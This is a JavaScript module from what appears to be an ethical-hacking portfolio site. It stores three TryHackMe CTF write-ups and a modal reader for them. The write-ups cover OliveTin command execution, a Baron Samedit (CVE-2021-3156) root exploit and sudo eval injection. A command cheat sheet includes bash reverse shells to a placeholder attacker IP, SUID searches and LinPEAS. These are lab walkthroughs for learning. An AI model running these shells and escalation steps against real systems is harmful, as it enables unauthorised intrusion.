/**
 * ETC (Ethical Coders) - Writeups Catalog & Modal Reader
 */

export const writeupsData = [
  {
    id: 'catpictures-ii',
    title: 'CatPictures-II: Full 3-Flag Exploitation',
    platform: 'TryHackMe',
    date: 'Oct 2026',
    category: 'linux',
    tags: ['OliveTin', 'Ansible', 'LinPEAS', 'CVE-2021-3156', 'PrivEsc'],
    snippet: 'Multi-stage Linux exploitation chaining image metadata disclosure, OliveTin arbitrary command execution, and Baron Samedit heap overflow to achieve root.',
    fullContent: `
# CatPictures-II CTF — Technical Walkthrough

**Full 3-Flag Exploitation Report**  
*Image Metadata → Hidden Repository → OliveTin / Ansible → LinPEAS → CVE-2021-3156 → root*

---

## Target Overview
- **Target Host**: \`catpictures-ii\`
- **Operating System**: Ubuntu 18.04.6 LTS (Kernel 4.15.0-206)
- **Key Exposed Service**: OliveTin Web UI (TCP 1337)
- **Initial Foothold User**: \`bismuth\` (\`uid=1000\`)
- **Privilege Escalation**: CVE-2021-3156 (*Baron Samedit*)
- **Final Privilege**: \`uid=0(root)\`
- **Flags Captured**: 3 / 3

---

## 1. Flag 1 — Image Metadata to Hidden Repository
The initial vector involved passive reconnaissance on an image hosted by the web server. Using \`exiftool\` and \`strings\`, a hidden URL was uncovered in the image metadata pointing to an internal Git repository. The repository disclosed environmental configurations and granted Flag 1.

---

## 2. Flag 2 — OliveTin / Ansible Command Execution
Port 1337 was running an OliveTin service with a button configured to *"Run Ansible Playbook"*. By passing customized commands into the execution context, arbitrary command execution was achieved as user \`bismuth\` (\`uid=1000\`).

\`\`\`bash
whoami          # bismuth
id              # uid=1000(bismuth) gid=1000(bismuth)
cat /home/bismuth/flag2.txt
\`\`\`

### Evidentiary Screenshot: Home Directory
<img src="Tryhackme/assets/catpictures-ii/01_home_bismuth_directory_listing.png" alt="Home Directory Listing" />

---

## 3. Flag 3 — Privilege Escalation (Baron Samedit)
Running LinPEAS highlighted **CVE-2021-3156** (*Baron Samedit*) due to the legacy sudo version on Ubuntu 18.04.6.

### Build Troubleshooting
The staged Makefile initially referenced \`sice.c\` instead of \`side.c\`. After verifying TAB indentation with \`sed -n 'l'\` and creating the \`libnss_X\` directory, the exploit compiled cleanly:

<img src="Tryhackme/assets/catpictures-ii/03_makefile_inspection_defect.png" alt="Makefile Inspection" />

<img src="Tryhackme/assets/catpictures-ii/04_libnss_directory_creation.png" alt="Creating libnss_X Directory" />

### Successful Root Shell
Executing the compiled binary resulted in immediate \`uid=0(root)\` escalation:

\`\`\`bash
make
chmod +x ./exploit
./exploit
# uid=0(root) gid=1000(bismuth)
cat /root/root.txt
\`\`\`

<img src="Tryhackme/assets/catpictures-ii/05_root_privilege_escalation_proof.png" alt="Root Shell Proof" />
`
  },
  {
    id: 'ua-high-school',
    title: 'U.A. High School CTF Command Playbook',
    platform: 'TryHackMe',
    date: 'Oct 2026',
    category: 'web',
    tags: ['Nmap', 'Command Injection', 'Stego', 'Eval', 'Sudo'],
    snippet: 'Step-by-step offensive methodology from web command injection to PNG magic byte reconstruction, steghide decryption, and sudo eval privilege escalation.',
    fullContent: `
# U.A. High School — Command Playbook

**A Command-by-Command Learning Reference**  
*Recon → Web Injection → Stego / Magic Bytes → Sudo eval PrivEsc*

---

## 1. Reconnaissance
\`\`\`bash
nmap -A -T4 TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## 2. Initial Access — Command Injection
A vulnerable PHP input on the web application allowed passing shell commands into the backend interpreter, returning a reverse shell as \`www-data\`:
\`\`\`bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")'
\`\`\`

## 3. Forensics & Magic Byte Repair
The file \`one-for-all.jpg\` contained damaged headers. Checking magic bytes:
\`\`\`bash
file one-for-all.jpg
xxd one-for-all.jpg | head
\`\`\`
Repairing the PNG header signature (\`89 50 4E 47 0D 0A 1A 0A\`) revealed passphrase-protected steganography:
\`\`\`bash
steghide extract -sf one-for-all.png
# Key: "all might forever" -> Extracted deku credentials
\`\`\`

## 4. Privilege Escalation — sudo eval
Checking sudo rights:
\`\`\`bash
sudo -l
# deku ALL=(ALL) NOPASSWD: /opt/NewComponent/feedback.sh
\`\`\`
The script evaluated unsanitized input using \`eval "echo $feedback"\`. Injecting full sudo privileges:
\`\`\`bash
deku ALL=NOPASSWD: ALL >> /etc/sudoers
sudo su
cat /root/root.txt
\`\`\`
`
  },
  {
    id: 'ctf-command-arsenal',
    title: 'CTF Command Arsenal Reference Guide',
    platform: 'All Platforms',
    date: 'Oct 2026',
    category: 'arsenal',
    tags: ['Cheat Sheet', 'Nmap', 'Reverse Shells', 'LinPEAS', 'Hashcat'],
    snippet: '10-phase master reference manual covering host discovery, port scanning, web fuzzing, password cracking, post-exploitation, and GTFOBins.',
    fullContent: `
# CTF Command Arsenal

**Comprehensive Reference Guide Across 10 CTF Phases**

---

### Phase 1 — Reconnaissance & Port Scanning
- **Nmap Aggressive**: \`nmap -A -T4 TARGET_IP\`
- **Nmap Full Range**: \`nmap -p- -T4 TARGET_IP\`
- **Rustscan Fast Sweep**: \`rustscan -a TARGET_IP -- -A\`

### Phase 2 — Web Enumeration & Fuzzing
- **Gobuster Dir**: \`gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt\`
- **Ffuf Parameter Fuzz**: \`ffuf -u "http://TARGET_IP/page?FUZZ=1" -w /usr/share/wordlists/dirb/common.txt\`

### Phase 3 — Reverse Shells & TTY Upgrade
- **Bash TCP**: \`bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\`
- **TTY Upgrade**: \`python3 -c 'import pty;pty.spawn("/bin/bash")'\` then \`Ctrl-Z; stty raw -echo; fg; export TERM=xterm\`

### Phase 4 — Privilege Escalation
- **Check Sudo**: \`sudo -l\`
- **Find SUID**: \`find / -perm -4000 -type f 2>/dev/null\`
- **LinPEAS**: \`./linpeas.sh | tee peas.txt\`
`
  }
];

export function initWriteups() {
  const container = document.getElementById('writeups-grid-container');
  const filterBtns = document.querySelectorAll('.filter-btn');
  const modal = document.getElementById('writeup-modal');
  const modalTitle = document.getElementById('modal-title-text');
  const modalBody = document.getElementById('modal-body-content');
  const closeModalBtn = document.getElementById('btn-close-modal');

  if (!container) return;

  function renderCards(filter = 'all') {
    container.innerHTML = '';
    const filtered = filter === 'all' 
      ? writeupsData 
      : writeupsData.filter(w => w.category === filter || (filter === 'tryhackme' && w.platform === 'TryHackMe'));

    filtered.forEach(item => {
      const card = document.createElement('div');
      card.className = 'writeup-card tilt-card reveal';
      card.innerHTML = `
        <div class="writeup-card-header">
          <span class="writeup-platform">${item.platform}</span>
          <span class="writeup-date">${item.date}</span>
        </div>
        <h3 class="writeup-title">${item.title}</h3>
        <p class="writeup-snippet">${item.snippet}</p>
        <div class="writeup-meta-footer">
          <div class="writeup-tags">
            ${item.tags.slice(0, 3).map(t => `<span class="skill-tag">#${t}</span>`).join('')}
          </div>
          <span class="writeup-read-action">Read Writeup →</span>
        </div>
      `;

      card.addEventListener('click', () => openModal(item));
      container.appendChild(card);
    });
  }

  function openModal(item) {
    if (!modal || !modalTitle || !modalBody) return;
    modalTitle.textContent = item.title;
    
    // Simple markdown-to-HTML parser for formatted display
    let html = item.fullContent
      .replace(/^### (.*$)/gim, '<h3>$1</h3>')
      .replace(/^## (.*$)/gim, '<h2>$1</h2>')
      .replace(/^# (.*$)/gim, '<h1>$1</h1>')
      .replace(/\*\*(.*?)\*\*/gim, '<strong>$1</strong>')
      .replace(/\*(.*?)\*/gim, '<em>$1</em>')
      .replace(/```bash([\s\S]*?)```/gim, '<pre><code>$1</code></pre>')
      .replace(/```([\s\S]*?)```/gim, '<pre><code>$1</code></pre>')
      .replace(/`([^`]+)`/gim, '<code>$1</code>')
      .replace(/\n\n/gim, '<br><br>');

    modalBody.innerHTML = html;
    modal.classList.add('is-active');
    document.body.style.overflow = 'hidden';
  }

  function closeModal() {
    if (!modal) return;
    modal.classList.remove('is-active');
    document.body.style.overflow = 'auto';
  }

  if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) closeModal();
    });
  }

  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal && modal.classList.contains('is-active')) {
      closeModal();
    }
  });

  filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      filterBtns.forEach(b => b.classList.remove('is-active'));
      btn.classList.add('is-active');
      renderCards(btn.getAttribute('data-filter'));
    });
  });

  renderCards();
}
